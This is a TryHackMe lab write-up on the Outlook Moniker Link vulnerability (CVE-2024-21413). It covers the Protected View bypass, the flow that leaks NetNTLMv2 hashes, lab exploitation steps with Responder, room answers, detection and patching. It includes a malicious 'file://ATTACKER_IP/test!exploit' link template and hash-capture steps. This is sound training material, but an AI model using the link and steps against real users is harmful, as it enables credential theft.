
TryHackMe Write-Up
Room: Moniker Link (CVE-2024-21413)
========================================================

Platform: TryHackMe  
Difficulty: Easy  
Category: Email Exploitation / Credential Harvesting  
CVE: CVE-2024-21413  
Severity: Critical  
CVSS Publish Date: 13 February 2024

--------------------------------------------------------
1. Introduction
--------------------------------------------------------

This room covers a critical vulnerability in Microsoft Outlook identified as
CVE-2024-21413, commonly referred to as the "Moniker Link" vulnerability.

The issue allows an attacker to bypass Outlook’s Protected View by abusing a
specially crafted hyperlink. When a victim clicks this malicious link,
Outlook triggers a Windows authentication attempt that leaks the user’s
NetNTLMv2 hash to the attacker.

This attack requires only user interaction (clicking the link) and does not
display any warning or security prompt, making it particularly dangerous in
real-world phishing scenarios.

--------------------------------------------------------
2. Vulnerability Overview
--------------------------------------------------------

### What is NTLM?

NTLM (NT LAN Manager) is a suite of Microsoft security protocols used for
authentication, integrity, and confidentiality. When Windows accesses a
remote resource (such as an SMB share), it may automatically authenticate
using NTLM-based Single Sign-On.

### Affected Products

The vulnerability affects the following Microsoft products:

- Microsoft Office LTSC 2021  
  Affected from version 19.0.0

- Microsoft 365 Apps for Enterprise  
  Affected from version 16.0.1

- Microsoft Office 2019  
  Affected from version 16.0.1

- Microsoft Office 2016  
  Affected from version 16.0.0 before 16.0.5435.1001

### CVE Severity

Severity rating assigned to CVE-2024-21413:  
**Critical**

--------------------------------------------------------
3. Moniker Links and Protected View
--------------------------------------------------------

Outlook supports rendering emails as HTML and allows special hyperlinks known
as *Moniker Links*. One example is the `file://` protocol, which enables access
to local or remote files through Windows mechanisms.

Normally, Outlook protects users from dangerous links by enabling
**Protected View**. When a potentially unsafe link is clicked, Outlook:

- Opens the email in read-only mode
- Blocks automatic external connections
- Prompts the user before taking action

Example of a normal, blocked link:

    file://SERVER/share

In this case, Outlook correctly blocks or warns the user, preventing any SMB
connection and stopping credential leakage.

--------------------------------------------------------
4. The Vulnerability
--------------------------------------------------------

The vulnerability occurs due to a parsing flaw in Outlook when handling
Moniker Links that contain a **special character**, such as an exclamation
mark (`!`).

Malicious example:

    file://ATTACKER_IP/test!exploit

Because of this malformed link:

- Protected View fails to trigger
- No warning or confirmation is shown
- The link is incorrectly treated as safe

--------------------------------------------------------
5. Impact and Attack Flow
--------------------------------------------------------

Once the victim clicks the malicious link:

1. Windows interprets the `file://` link as a remote file access attempt
2. Windows initiates an SMB connection to the attacker’s machine
3. SMB automatically attempts authentication using the victim’s credentials
4. The victim’s NetNTLMv2 hash is sent to the attacker
5. This happens even if the file or share does not exist

### Impact

- Leakage of NetNTLMv2 hashes
- Hashes can be cracked offline or relayed in NTLM relay attacks
- No user warning due to Protected View bypass
- Theoretically possible RCE due to COM usage (no public PoC available)

--------------------------------------------------------
6. Exploitation
--------------------------------------------------------

### Tools Used

- Custom Python exploit provided by the room
- Responder (SMB listener)
- Microsoft Outlook (victim machine)

### Step 1: Prepare the Exploit

The room provides an exploit file (`exploit.png`) which sends a malicious
email to the victim. This exploit is saved locally as:

    exploit.py

[IMAGE: exploit.png]

### Step 2: Start SMB Listener

Responder is used to listen for incoming SMB authentication attempts.

[IMAGE: responder.png]

Responder captures NTLM-based authentication requests sent by the victim.

### Step 3: Configure Outlook on Victim Machine

Outlook is configured and running on the victim machine to receive emails.

[IMAGE: outlook.png]

### Step 4: Modify the Exploit

Edit the exploit file to:

- Replace the Moniker Link IP with the attacker’s IP
- Set the mail server IP to the Target IP Address (provided by the room)

### Step 5: Run the Exploit

Execute the exploit:

    python3 exploit.py
    Password: attacker

[IMAGE: running.png]

The exploit confirms successful delivery with:

    "Email delivered"

### Step 6: Victim Interaction

The victim receives the email and clicks the malicious link.

[IMAGE: email_received.png]

### Step 7: Capture the Hash

Responder captures the victim’s NetNTLMv2 hash.

[IMAGE: hash.png]

--------------------------------------------------------
7. Questions & Answers
--------------------------------------------------------

Q: What Moniker Link type is used in the hyperlink?  
A: file://

Q: What special character is used to bypass Protected View?  
A: !

Q: What application is used to capture the user’s hash?  
A: Responder

Q: What type of hash is captured?  
A: NetNTLMv2

--------------------------------------------------------
8. Detection
--------------------------------------------------------

A YARA rule has been created by Florian Roth to detect malicious emails
containing `file:\\` Moniker Links.

Repository:
https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/

Additionally, SMB authentication attempts can be observed in packet captures,
where a truncated NetNTLMv2 hash is visible.

--------------------------------------------------------
9. Remediation
--------------------------------------------------------

Microsoft released patches addressing this vulnerability during the February
2024 Patch Tuesday.

Recommended actions:

- Update Microsoft Office via Windows Update or Microsoft Update Catalog
- Apply the appropriate KB patches for affected Office builds

Additional security recommendations:

- Do not click unsolicited or suspicious links
- Preview hyperlinks before clicking
- Report suspicious emails to the security team

Because this vulnerability bypasses Protected View, Outlook cannot be safely
configured to mitigate this issue. Blocking SMB entirely is not recommended,
as it may disrupt legitimate network operations. However, blocking SMB at the
firewall level may be considered depending on organizational requirements.

--------------------------------------------------------
10. Conclusion
--------------------------------------------------------

CVE-2024-21413 demonstrates how subtle parsing flaws can completely bypass
important security mechanisms like Outlook’s Protected View. This vulnerability
highlights the risks associated with implicit trust in protocol handlers and
automatic authentication mechanisms such as NTLM.

This room provides an excellent introduction to real-world email-based
credential harvesting attacks and reinforces the importance of patch
management and user awareness.
========================================================
